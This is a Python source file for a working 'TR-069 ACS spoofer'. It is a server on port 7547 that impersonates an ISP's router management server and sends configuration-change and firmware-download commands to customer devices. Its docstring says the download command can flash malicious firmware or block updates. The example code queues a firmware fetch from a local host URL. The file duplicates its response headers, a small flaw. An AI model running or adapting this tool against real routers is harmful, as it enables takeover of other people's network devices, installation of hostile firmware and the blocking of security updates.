import http.server
import socketserver
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ACSSpooferHandler(http.server.BaseHTTPRequestHandler):
    """
    A handler for TR-069 (CWMP) messages.
    This initial version will simply log incoming requests and provide a basic response.
    """
    def do_POST(self):
        """
        Handles incoming POST requests from the CPE.
        The initial message from a CPE is an "Inform" RPC.
        """
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        logging.info(f"Received TR-069 request from {self.client_address[0]}")
        logging.debug(f"Request Headers:\n{self.headers}")
        logging.info(f"Request Body (SOAP):\n{post_data.decode('utf-8')}")

        # For now, send a generic successful response.
        # In a real scenario, we would parse the Inform and send an InformResponse.
        self.send_response(200)
        self.send_header('Content-type', 'text/xml; charset="utf-8"')
        self.end_headers()

        # Check if there are commands to be sent
        if self.server.commands:
            response_body = self.server.commands.pop(0)
            logging.info(f"Sending command to CPE:\n{response_body}")
        else:
            # Send a generic InformResponse if no commands are queued
            response_body = """<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<cwmp:InformResponse xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<MaxEnvelopes>1</MaxEnvelopes>
</cwmp:InformResponse>
</soap:Body>
</soap:Envelope>"""
            logging.info("No commands in queue. Sent generic InformResponse to CPE.")

        self.send_response(200)
        self.send_header('Content-type', 'text/xml; charset="utf-8"')
        self.send_header('SOAPAction', '')
        self.end_headers()
        self.wfile.write(response_body.encode('utf-8'))


    def do_GET(self):
        """
        Handles GET requests. TR-069 primarily uses POST, but we can provide a status page.
        """
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<html><head><title>ACS Spoofer</title></head>")
        self.wfile.write(b"<body><h1>TR-069 ACS Spoofer is running.</h1>")
        self.wfile.write(b"<p>Listening for CPE connections...</p>")
        if self.server.commands:
            self.wfile.write(b"<h2>Pending Commands:</h2><pre>")
            for cmd in self.server.commands:
                self.wfile.write(cmd.encode('utf-8'))
            self.wfile.write(b"</pre>")
        else:
            self.wfile.write(b"<p>No commands in queue.</p>")
        self.wfile.write(b"</body></html>")

class ACSSpooferServer(socketserver.TCPServer):
    """
    Custom TCPServer to hold the command queue.
    """
    def __init__(self, server_address, RequestHandlerClass):
        super().__init__(server_address, RequestHandlerClass)
        self.commands = []

class ACSSpoofer:
    """
    The main class for the Auto Configuration Server (ACS) spoofer.
    """
    def __init__(self, host="0.0.0.0", port=7547):
        self.host = host
        self.port = port
        self.httpd = None
        self.commands = []

    def queue_set_parameter_value(self, parameter, value, data_type="xsd:int"):
        """
        Queues a SetParameterValues RPC to be sent to the CPE.
        """
        command = f"""<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap:Header>
</soap:Header>
<soap:Body>
<cwmp:SetParameterValues>
<ParameterList soap:arrayType="cwmp:ParameterValueStruct[1]">
<ParameterValueStruct>
<Name>{parameter}</Name>
<Value xsi:type="{data_type}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">{value}</Value>
</ParameterValueStruct>
</ParameterList>
<ParameterKey>DSLBYPASS_ULTRA</ParameterKey>
</cwmp:SetParameterValues>
</soap:Body>
</soap:Envelope>"""
        self.commands.append(command)
        if self.httpd:
            self.httpd.commands.append(command)
        logging.info(f"Queued command to set {parameter} to {value}")

    def queue_firmware_download_request(self, url, file_size, file_type="1 Firmware Upgrade Image"):
        """
        Queues a Download RPC to be sent to the CPE.
        This can be used to prevent updates (by providing a bad URL)
        or to flash custom firmware (by providing a URL to a malicious file).
        """
        command = f"""<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap:Header>
</soap:Header>
<soap:Body>
<cwmp:Download>
<CommandKey>DSLBYPASS_FW_UPDATE</CommandKey>
<FileType>{file_type}</FileType>
<URL>{url}</URL>
<Username></Username>
<Password></Password>
<FileSize>{file_size}</FileSize>
<TargetFileName>firmware.bin</TargetFileName>
<DelaySeconds>0</DelaySeconds>
<SuccessURL></SuccessURL>
<FailureURL></FailureURL>
</cwmp:Download>
</soap:Body>
</soap:Envelope>"""
        self.commands.append(command)
        if self.httpd:
            self.httpd.commands.append(command)
        logging.info(f"Queued firmware download command for URL: {url}")

    def start(self):
        """
        Starts the ACS spoofer HTTP server.
        """
        try:
            # Set allow_reuse_address on our custom server class
            ACSSpooferServer.allow_reuse_address = True
            self.httpd = ACSSpooferServer((self.host, self.port), ACSSpooferHandler)
            self.httpd.commands = self.commands

            logging.info(f"Starting TR-069 ACS Spoofer on http://{self.host}:{self.port}")
            self.httpd.serve_forever()
        except OSError as e:
            logging.error(f"Failed to start server on port {self.port}: {e}")
            logging.error("This may be due to insufficient privileges or the port being in use.")
        except Exception as e:
            logging.error(f"An unexpected error occurred: {e}")
        finally:
            if self.httpd:
                self.httpd.server_close()
                logging.info("ACS Spoofer server shut down.")

    def stop(self):
        """
        Stops the ACS spoofer server.
        """
        if self.httpd:
            logging.info("Shutting down ACS Spoofer...")
            self.httpd.shutdown()

if __name__ == '__main__':
    # This allows the spoofer to be run directly for testing purposes.
    spoofer = ACSSpoofer()

    # Example: Queue a command to change the periodic inform interval
    spoofer.queue_set_parameter_value(
        parameter="InternetGatewayDevice.ManagementServer.PeriodicInformInterval",
        value="30"
    )

    # Example: Queue a command to initiate a firmware download
    # The CPE will attempt to download from this URL.
    # We could host a custom firmware image at this location.
    spoofer.queue_firmware_download_request(
        url="http://192.168.1.10:8080/custom_firmware.bin",
        file_size=12345678
    )

    try:
        spoofer.start()
    except KeyboardInterrupt:
        spoofer.stop()
        logging.info("Server stopped by user.")